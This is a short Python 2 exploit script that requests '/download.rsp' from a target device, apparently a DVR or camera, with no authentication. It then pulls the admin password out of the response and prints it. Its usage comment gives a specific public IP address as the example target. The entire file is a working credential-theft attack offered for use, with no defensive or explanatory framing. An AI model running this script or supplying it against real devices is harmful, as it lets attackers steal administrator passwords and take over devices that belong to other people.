import requests
import sys

#eg VXR_PASSLEAK.py http://78.161.28.235

if sys.argv[1]:
	try:
		res = requests.get(sys.argv[1]+'/download.rsp', headers="", verify=False, timeout=5)
	except Exception as e:
		print 'time out'
	else:
		if res.content.split('admin')[1][:10]=='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00':
			print 'admin:',res.content.split('admin')[1][:50].replace('\x00','')
		else:
			if res.content.split('admin')[2][:10]=='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00':
				print 'admin:',res.content.split('admin')[2][:50].replace('\x00','')